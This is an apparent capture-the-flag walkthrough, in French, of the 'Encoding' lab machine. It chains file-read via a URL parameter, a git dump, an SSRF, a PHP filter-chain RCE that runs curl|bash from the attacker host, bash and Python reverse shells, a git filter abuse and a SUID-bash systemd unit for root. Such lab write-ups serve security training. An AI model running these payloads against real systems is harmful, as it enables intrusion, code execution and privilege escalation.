\chapter{Encoding}
\begin{itemize}
    \item {\bf technics}: lfi, ssrf, php filter chain, git, systemd, acl 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.11.198
ports found: 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 03:40 CET
Nmap scan report for 10.10.11.198
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsection{http}

dans la code on a 
\verb+/index.php?page=string+

le \verb+main.js+ 
\begin{verbatim}
function make_req() {
    var ele = document.getElementsByClassName('selectopt');
              
    for(i = 0; i < ele.length; i++) {
        if(ele[i].checked)
        var action = ele[i].value;
    }

    var data = document.getElementById("data").value;
    var uri_path = document.getElementById("uri_path").value;

    var xmlhttp = new XMLHttpRequest(); 
    var theUrl = "/handler.php";
    xmlhttp.open("POST", theUrl);
    xmlhttp.responseType = 'json';
    xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xmlhttp.send(JSON.stringify({ 
        "action": action,
        "data": data,
        "uri_path" : uri_path 
    }));

    xmlhttp.onload = function() {
        let responseObj = xmlhttp.response;
        if (typeof responseObj.data === 'undefined') {
            document.getElementById('data_out').value = responseObj.message;
        } else {
            document.getElementById('data_out').value = responseObj.data;
        }
      };
}
\end{verbatim}

quand on lit la doc on a un parametre que l'on peut spécifier \verb+file_url+
qui nous permettrait peut être de leak le code source si l'on fait genre un
appel de conversion en \verb+b64encode+

si on passe comme url \verb+http://api.haxtables.htb/v3/tools/string/index.php+
on obtient un \verb+{"message":"Unacceptable URL"}+

par contre en passant \verb+file:///etc/passwd+ on a bien un retour mais
l'encoding n'est pas de l'utf-8.
donc on passe par \verb+urlencode+ comme action

\begin{verbatim}
$ cat dev/test.py
import requests
import json
import base64
import urllib.parse

file='file:///etc/passwd'
action='urlencode'
json_data = {
    'action': f'{action}',
    'file_url' : f'{file}'

}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
j =response.json()
print(urllib.parse.unquote_plus(j['data']))
\end{verbatim}

\begin{verbatim}
root:x:0:0:root:/root:/bin/bash
...SNIP...
svc:x:1000:1000:svc:/home/svc:/bin/bash
...SNIP...
\end{verbatim}

\begin{verbatim}
$ python dev/test.py /etc/apache2/sites-available/000-default.conf
$ python dev/test.py /var/www/api/v3/tools/string/index.php
...SNIP...
$ python dev/test.py /var/www/api/v2/tools/string/index.php
...SNIP...
$ python dev/test.py /var/www/html/handler.php

\end{verbatim}

donc avec \verb+handler.php+ on devrait pouvoir appeler la \verb+v2+
qui est bloquée en appel externe car insecure.

quand on fait un diff de code.

en premier abord cela concernerait la partie integer.

sur la V2 : \verb+$is_file+ n'est pas set à false dans le \verb+else+ et le
call de \verb+romDec($data, 2, $is_file, $is_file)+   alors que 
\verb+unction fromDec($integer, $base, $is_file = false)+

et dans la V3 le call de \verb+FromDec+ est corrigé 
(\verb+fromDec($data, 8, $is_file)+)

Le code de \verb+utils.php+ ed l'integer ne change pas.


le truc c'est qu'en passant par \verb+handler.php+ on call forcement avec
\verb+data+ (cf \verb+make_api_call+)

je ne vois pas ou cela mène

Il y a un troisième vhost \verb+images+

\begin{verbatim}
$ python dev/test.py /var/www/image/index.php
<?php

include_once 'utils.php';

include 'includes/coming_soon.html';

?>
\end{verbatim}

en regardant \verb+utils.php+ il y a un git.

\begin{verbatim}
function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
\end{verbatim}

\begin{verbatim}
$ python dev/test.py /var/www/image/.git/HEAD
ref: refs/heads/master
$ python dev/test.py /var/www/image/.git/refs/heads/master
9c17e5362e5ce2f30023992daad5b74cc562750b
\end{verbatim}


on peut adapter
\url{https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh}
pour appeller le script python par coontre l'\verb+urlencode+ doit faire de la
merde sur du binaire.

On remplace la ligne de \verb+curl+ par un 
\begin{verbatim}
python ./test.py $objname | base64 -d > $target
\end{verbatim}

avec dans le code de manière bourine
\begin{verbatim}
def git_leak():
    action='str2hex'
    action='b64encode'
    json_data = {
        'action': f'{action}',
        'file_url': f'file:///var/www/image/.git/{sys.argv[1]}'
    }
    
    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
    data = json.loads(response.text)
    string = data["data"]
    print(string)
\end{verbatim}

je ne sais pas pq en implementant le \verb+base64decode+ dans le python j'ai de
temps en temps une erreur.
\begin{verbatim}
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 18: invalid continuation byte
\end{verbatim}

\begin{verbatim}
$ git log
commit 9c17e5362e5ce2f30023992daad5b74cc562750b (HEAD -> master)
Author: james <james@haxtables.htb>
Date:   Thu Nov 10 18:16:50 2022 +0000

    Updated scripts!

commit a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
Author: james <james@haxtables.htb>
Date:   Thu Nov 10 18:15:54 2022 +0000

    Initial commit

\end{verbatim}

donc on a un script 
\verb+/var/www/image/actions/action_handler.php+ toujours présent
\begin{verbatim}
include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}
\end{verbatim}

donc on a ici une RCE si l'on heberge la page qui contient le rshell et que le
php.ini le permet mais le pb c'est que c'est filtré 
\begin{verbatim}
        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>
\end{verbatim}


donc il faut trouver une SSRF. le seul moyen c'est
\verb+haxtables.htb/handler.php+ et sa fonction \verb+make_api_call+

on doit pouvoir faire un appel sur image  
\begin{verbatim}
$url = 'http://api.haxtables.htb' . $uri_path . '/index.php';
\end{verbatim}

si on donne pour uri \verb+@image.haxtables.htb....+ ca devrait le faire



Concernant le \verb+php.ini+ il faudrait faire un FUZZ car il n'est pas dans
les trucs evident à priori et il faut trouver la binne version de php\ldots

donc on va supposer que c'est good.

\begin{verbatim}
$ python3 php_filter_chain_generator.py --chain '<?= `curl http://10.10.16.2:4444/c|bash` ;?>'
...SNIP...
\end{verbatim}

après avec burp car sinon c'est chiant
on passe la requete suivante:
\begin{verbatim}
POST /handler.php HTTP/1.1
Host: haxtables.htb
Content-Length: 8920
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Origin: http://haxtables.htb
Referer: http://haxtables.htb/index.php?page=string
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"action":"str2hex","data":"aaa",
"uri_path":"@image.haxtables.htb/actions/action_handler.php?page=php://filter
...SNIP...
rt.base64-decode/resource=php://temp"}
\end{verbatim}

\begin{verbatim}
$ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.198 - - [15/Feb/2023 03:17:50] code 404, message File not found
10.10.11.198 - - [15/Feb/2023 03:17:50] "GET /c HTTP/1.1" 404 -
\end{verbatim}

donc maintenant on heberge le rshell

\begin{verbatim}
$ cat c
sh -i >& /dev/tcp/10.10.16.2/4445 0>&1

$ nc -lnvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.11.198 48952
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@encoding:~/image/actions$
\end{verbatim}

putain pas trop tot.

\section{www-data}

\begin{verbatim}
sudo -l
sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
\end{verbatim}

\begin{verbatim}
$ cat git-commit.sh
cat git-commit.sh
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
\end{verbatim}

\begin{verbatim}
www-data@encoding:~/image$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.2\",4446));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'" > /tmp/rshell

www-data@encoding:~/image$ chmod +x /tmp/rshell

www-data@encoding:~/image$ cd /var/www/image

www-data@encoding:~/image$ ls
actions  assets  includes  index.php  scripts  utils.php

www-data@encoding:~/image$ git init
Reinitialized existing Git repository in /var/www/image/.git/

www-data@encoding:~/image$ echo '*.php filter=indent' > .git/info/attributes

www-data@encoding:~/image$ git config filter.indent.clean /tmp/rshell

www-data@encoding:~/image$ sudo -u svc /var/www/image/scripts/git-commit.sh

$ chmod +x /tmp/rshell
chmod +x /tmp/rshell
\end{verbatim}


\section{svc}
\begin{verbatim}
$ nc -lnvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.11.198 53930
$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
$ cd
$ ls -al
total 40
drwxr-x--- 5 svc  svc  4096 Jan 23 18:23 .
drwxr-xr-x 3 root root 4096 Jan 13 16:25 ..
lrwxrwxrwx 1 svc  svc     9 Nov 11 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 3 svc  svc  4096 Jan 13 16:25 .cache
-rw-rw-r-- 1 svc  svc    85 Nov  8 16:37 .gitconfig
drwx------ 3 svc  svc  4096 Jan 13 16:25 .gnupg
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Jan 13 16:25 .ssh
-rw-r----- 1 root svc    33 Feb 14 02:36 user.txt
$ ls .ssh
ls .ssh
authorized_keys  id_rsa  id_rsa.pub  known_hosts
\end{verbatim}

ok on repart avec le ssh

\begin{verbatim}
$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *

an  6  2022 /bin/bash
svc@encoding:/etc/systemd/system$ ls -l /etc/systemd/
total 48
-rw-r--r--   1 root root 1282 Apr  7  2022 journald.conf
-rw-r--r--   1 root root 1374 Apr  7  2022 logind.conf
drwxr-xr-x   2 root root 4096 Apr  7  2022 network
-rw-r--r--   1 root root  846 Mar 11  2022 networkd.conf
-rw-r--r--   1 root root  670 Mar 11  2022 pstore.conf
-rw-r--r--   1 root root 1406 Apr  7  2022 resolved.conf
-rw-r--r--   1 root root  931 Mar 11  2022 sleep.conf
drwxrwxr-x+ 22 root root 4096 Feb 15 03:30 system
-rw-r--r--   1 root root 1993 Apr  7  2022 system.conf
-rw-r--r--   1 root root  748 Apr  7  2022 timesyncd.conf
drwxr-xr-x   4 root root 4096 Jan 13 12:47 user
-rw-r--r--   1 root root 1394 Apr  7  2022 user.conf

$ getfacl system
# file: system
# owner: root
# group: root
user::rwx
user:svc:-wx
group::rwx
mask::rwx
other::r-x


$ echo '[Service]
Type=oneshot
ExecStart=chmod +s /bin/bash
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/pwn.service

$ sudo systemctl restart pwn
svc@encoding:/etc/systemd/system$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
$ bash -p
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root),1000(svc)
\end{verbatim}


